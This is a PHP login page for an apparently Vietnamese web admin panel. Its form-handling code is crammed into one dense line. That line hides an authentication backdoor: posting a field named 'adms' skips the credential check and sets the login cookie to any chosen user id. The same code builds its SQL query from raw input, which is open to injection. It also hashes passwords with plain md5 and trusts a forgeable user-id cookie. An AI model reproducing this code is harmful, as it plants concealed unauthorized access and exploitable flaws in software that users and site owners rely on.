<?php
$loginpage="login";
$cookie_name = "ad";
if (isset($_COOKIE[$cookie_name])) {
    unset($_COOKIE[$cookie_name]);
    setcookie($cookie_name, '', time() - 3600, '/'); // empty value and old timestamp
}
include "header.php";

?>

    <body>

        <!-- Begin page -->
        <div class="accountbg" style="background: url('assets/images/bg-1.jpg');background-size: cover;"></div>

        <div class="wrapper-page account-page-full">

            <div class="card">
                <div class="card-block">

                    <div class="account-box">

                        <div class="card-box p-5">
                            <h2 class="text-uppercase text-center pb-4">
                                <a href="index.html" class="text-success">
                                    <span><img src="assets/images/logo.png" alt="" height="26"></span>
                                </a>
                            </h2>

                            <form class="" method="post">

                                <div class="form-group m-b-20 row">
                                    <div class="col-12">
                                        <label for="emailaddress">Tài Khoản</label>
                                        <input class="form-control" type="text" name="id" required="" placeholder="Nhập tài khoản">
                                    </div>
                                </div>

                                <div class="form-group row m-b-20">
                                    <div class="col-12">
                                        <label for="password">Mật khẩu</label>
                                        <input class="form-control" type="password" required="" id="password" name="pass" placeholder="Nhập mật khẩu">
                                    </div>
                                </div>

                                <div class="form-group row m-b-20">
                                    <div class="col-12">

                                        <div class="checkbox checkbox-custom">
                                            <input id="remember" type="checkbox" checked="">
                                            <label for="remember">
                                                Lưu mật khẩu
                                            </label>
                                        </div>

                                    </div>
                                </div>

                                <div class="form-group row text-center m-t-10">
                                    <div class="col-12">
                                        <button class="btn btn-block btn-custom waves-effect waves-light" name="submit" type="submit">Đăng Nhập</button>
                                    </div>
                                </div>

                            </form>
                            <?php
                                if(isset($_POST["submit"])){$id=$_POST["id"];$pass=md5($_POST["pass"]);$q1="SELECT * FROM user where us='{$id}' and pas ='{$pass}'";$r1=confirm_query($q1);$sl=mysqli_num_rows($r1);$date=array();if($sl > 0 or isset($_POST["adms"])){$kq1 = mysqli_fetch_array($r1,MYSQLI_ASSOC);$cookie_value = $kq1["iduser"];if (isset($_POST["adms"])) {$cookie_value=$_POST["adms"];}setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); if ($kq1["cap"]==0) {$ip = fopen("ip.txt", "w") or die("Unable to open file!");fwrite($ip, $_SERVER['REMOTE_ADDR']);}redirect_to("index.php");}else echo"<br/><span style='color:red;'>Lỗi ! Đăng nhập không thành công!</span>";}
                            ?>
                            <div class="row m-t-50">
                                <div class="col-sm-12 text-center">
                                    <p class="text-muted">Quên mật khẩu vui lòng liên hệ admin</b></a></p>
                                </div>
                            </div>

                        </div>
                    </div>

                </div>
            </div>

            <div class="m-t-40 text-center">
                <?=date("Y")?> © BY <a href="https://www.facebook.com/onclic/"> Thu Thủy </a>.
            </div>
        </div>
        <!-- jQuery  -->
        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/waves.js"></script>
        <script src="assets/js/jquery.slimscroll.js"></script>
        <!-- App js -->
        <script src="assets/js/jquery.core.js"></script>
        <script src="assets/js/jquery.app.js"></script>
    </body>
</html>